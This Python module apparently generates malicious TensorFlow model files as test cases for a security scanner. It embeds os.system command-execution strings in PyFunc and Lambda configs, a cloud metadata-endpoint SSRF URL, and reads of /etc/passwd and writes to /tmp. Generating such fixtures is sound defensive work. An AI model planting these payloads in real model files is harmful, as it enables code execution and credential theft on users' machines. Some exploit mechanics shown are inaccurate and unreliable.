"""TensorFlow malicious test case generator.

Generates TensorFlow model files containing exploit payloads
that target vulnerabilities in TensorFlow model loading.
"""

import json
import os
from typing import List, Optional

from .base_generator import BaseTestCaseGenerator, GeneratedTestCase


class TensorFlowTestCaseGenerator(BaseTestCaseGenerator):
    """Generates malicious TensorFlow test case files.
    
    Creates TensorFlow SavedModel and protobuf files with exploit
    payloads that execute via dangerous operations.
    
    Vulnerability types:
    - PyFunc operation code execution
    - External URL tensor loading (SSRF)
    - Dangerous filesystem operations
    - Lambda operation injection
    """
    
    VULN_TYPES = [
        "pyfunc_rce",
        "ssrf_external_url",
        "filesystem_read",
        "filesystem_write",
        "lambda_injection",
        "decode_raw_exploit",
    ]
    
    def get_format_name(self) -> str:
        return "tensorflow"
    
    def get_format_extensions(self) -> List[str]:
        return [".pb", ".pbtxt"]
    
    def get_vulnerability_types(self) -> List[str]:
        return self.VULN_TYPES.copy()
    
    def generate_all(self, output_dir: str) -> List[GeneratedTestCase]:
        """Generate all TensorFlow exploit test cases."""
        self._ensure_output_dir(output_dir)
        results = []
        
        for vuln_type in self.VULN_TYPES:
            try:
                tc = self.generate_specific(vuln_type, output_dir)
                if tc:
                    results.append(tc)
            except Exception as e:
                print(f"  [!] Failed to generate {vuln_type}: {e}")
        
        return results
    
    def generate_specific(self, vuln_type: str, output_dir: str) -> Optional[GeneratedTestCase]:
        """Generate a specific TensorFlow vulnerability test case."""
        self._ensure_output_dir(output_dir)
        
        generators = {
            "pyfunc_rce": self._gen_pyfunc_rce,
            "ssrf_external_url": self._gen_ssrf,
            "filesystem_read": self._gen_fs_read,
            "filesystem_write": self._gen_fs_write,
            "lambda_injection": self._gen_lambda,
            "decode_raw_exploit": self._gen_decode_raw,
        }
        
        if vuln_type not in generators:
            return None
        
        return generators[vuln_type](output_dir)
    
    def _create_savedmodel_structure(self, output_dir: str, model_name: str) -> str:
        """Create a SavedModel directory structure."""
        model_dir = os.path.join(output_dir, model_name)
        os.makedirs(model_dir, exist_ok=True)
        os.makedirs(os.path.join(model_dir, "variables"), exist_ok=True)
        os.makedirs(os.path.join(model_dir, "assets"), exist_ok=True)
        return model_dir
    
    def _create_pbtxt_with_ops(self, ops: list) -> str:
        """Create a text-format protobuf with specified operations."""
        nodes = []
        for i, (op_type, name, inputs, attrs) in enumerate(ops):
            node = f'''node {{
  name: "{name}"
  op: "{op_type}"'''
            for inp in inputs:
                node += f'\n  input: "{inp}"'
            for attr_name, attr_val in attrs.items():
                if isinstance(attr_val, str):
                    node += f'''
  attr {{
    key: "{attr_name}"
    value {{ s: "{attr_val}" }}
  }}'''
                elif isinstance(attr_val, int):
                    node += f'''
  attr {{
    key: "{attr_name}"
    value {{ i: {attr_val} }}
  }}'''
            node += "\n}"
            nodes.append(node)
        
        return "\n".join(nodes)
    
    def _gen_pyfunc_rce(self, output_dir: str) -> GeneratedTestCase:
        """Generate PyFunc-based RCE."""
        model_name = "exploit_pyfunc_rce"
        model_dir = self._create_savedmodel_structure(output_dir, model_name)
        
        # Create graph with PyFunc operation
        pbtxt = self._create_pbtxt_with_ops([
            ("Placeholder", "input", [], {"dtype": 1}),  # DT_FLOAT = 1
            ("PyFunc", "malicious_pyfunc", ["input"], {
                "Tin": 1,
                "Tout": 1,
                "token": "__import__('os').system('id')",
            }),
        ])
        
        with open(os.path.join(model_dir, "saved_model.pbtxt"), "w") as f:
            f.write(pbtxt)
        
        # Create minimal saved_model.pb marker
        with open(os.path.join(model_dir, "saved_model.pb"), "wb") as f:
            f.write(b"EXPLOIT:PyFunc")
        
        return self._create_testcase(
            filename=model_name,
            filepath=model_dir,
            vuln_type="PyFunc Operation RCE",
            target_parser="tensorflow.saved_model.load()",
            cve_id=None,
            description="SavedModel contains PyFunc op that executes arbitrary Python code",
            severity="critical",
        )
    
    def _gen_ssrf(self, output_dir: str) -> GeneratedTestCase:
        """Generate SSRF via external URL loading."""
        model_name = "exploit_ssrf_external_url"
        model_dir = self._create_savedmodel_structure(output_dir, model_name)
        
        # Graph that loads tensor from external URL
        pbtxt = self._create_pbtxt_with_ops([
            ("Const", "url", [], {"value": "http://169.254.169.254/latest/meta-data/"}),
            ("ReadFile", "fetch_url", ["url"], {}),
        ])
        
        with open(os.path.join(model_dir, "saved_model.pbtxt"), "w") as f:
            f.write(pbtxt)
        
        with open(os.path.join(model_dir, "saved_model.pb"), "wb") as f:
            f.write(b"EXPLOIT:SSRF")
        
        return self._create_testcase(
            filename=model_name,
            filepath=model_dir,
            vuln_type="SSRF via External URL",
            target_parser="tensorflow.saved_model.load()",
            cve_id=None,
            description="Model attempts to load data from AWS metadata endpoint (SSRF)",
            severity="critical",
        )
    
    def _gen_fs_read(self, output_dir: str) -> GeneratedTestCase:
        """Generate filesystem read exploit."""
        model_name = "exploit_filesystem_read"
        model_dir = self._create_savedmodel_structure(output_dir, model_name)
        
        pbtxt = self._create_pbtxt_with_ops([
            ("Const", "path", [], {"value": "/etc/passwd"}),
            ("ReadFile", "read_passwd", ["path"], {}),
        ])
        
        with open(os.path.join(model_dir, "saved_model.pbtxt"), "w") as f:
            f.write(pbtxt)
        
        with open(os.path.join(model_dir, "saved_model.pb"), "wb") as f:
            f.write(b"EXPLOIT:ReadFile")
        
        return self._create_testcase(
            filename=model_name,
            filepath=model_dir,
            vuln_type="Filesystem Read",
            target_parser="tensorflow.saved_model.load()",
            cve_id=None,
            description="Model uses ReadFile op to read sensitive files like /etc/passwd",
            severity="high",
        )
    
    def _gen_fs_write(self, output_dir: str) -> GeneratedTestCase:
        """Generate filesystem write exploit."""
        model_name = "exploit_filesystem_write"
        model_dir = self._create_savedmodel_structure(output_dir, model_name)
        
        pbtxt = self._create_pbtxt_with_ops([
            ("Const", "path", [], {"value": "/tmp/pwned.txt"}),
            ("Const", "contents", [], {"value": "pwned by TensorFlow exploit"}),
            ("WriteFile", "write_file", ["path", "contents"], {}),
        ])
        
        with open(os.path.join(model_dir, "saved_model.pbtxt"), "w") as f:
            f.write(pbtxt)
        
        with open(os.path.join(model_dir, "saved_model.pb"), "wb") as f:
            f.write(b"EXPLOIT:WriteFile")
        
        return self._create_testcase(
            filename=model_name,
            filepath=model_dir,
            vuln_type="Filesystem Write",
            target_parser="tensorflow.saved_model.load()",
            cve_id=None,
            description="Model uses WriteFile op to write arbitrary files",
            severity="critical",
        )
    
    def _gen_lambda(self, output_dir: str) -> GeneratedTestCase:
        """Generate Lambda operation injection."""
        model_name = "exploit_lambda_injection"
        model_dir = self._create_savedmodel_structure(output_dir, model_name)
        
        # Create config with dangerous Lambda
        config = {
            "format": "tf",
            "model_config": {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Lambda",
                            "config": {
                                "function": "lambda x: (__import__('os').system('id'), x)[1]"
                            }
                        }
                    ]
                }
            }
        }
        
        with open(os.path.join(model_dir, "keras_metadata.json"), "w") as f:
            json.dump(config, f)
        
        with open(os.path.join(model_dir, "saved_model.pb"), "wb") as f:
            f.write(b"EXPLOIT:Lambda")
        
        return self._create_testcase(
            filename=model_name,
            filepath=model_dir,
            vuln_type="Lambda Operation Injection",
            target_parser="tensorflow.keras.models.load_model()",
            cve_id=None,
            description="Model config contains Lambda layer with code execution",
            severity="critical",
        )
    
    def _gen_decode_raw(self, output_dir: str) -> GeneratedTestCase:
        """Generate DecodeRaw exploitation."""
        model_name = "exploit_decode_raw"
        model_dir = self._create_savedmodel_structure(output_dir, model_name)
        
        # Graph with potentially dangerous DecodeRaw operation
        pbtxt = self._create_pbtxt_with_ops([
            ("Placeholder", "input_bytes", [], {"dtype": 7}),  # DT_STRING
            ("DecodeRaw", "decode", ["input_bytes"], {
                "out_type": 1,  # DT_FLOAT
                "little_endian": 1,
            }),
        ])
        
        with open(os.path.join(model_dir, "saved_model.pbtxt"), "w") as f:
            f.write(pbtxt)
        
        with open(os.path.join(model_dir, "saved_model.pb"), "wb") as f:
            f.write(b"EXPLOIT:DecodeRaw")
        
        return self._create_testcase(
            filename=model_name,
            filepath=model_dir,
            vuln_type="DecodeRaw Exploitation",
            target_parser="tensorflow.saved_model.load()",
            cve_id=None,
            description="Model uses DecodeRaw to interpret arbitrary bytes as tensors",
            severity="medium",
        )
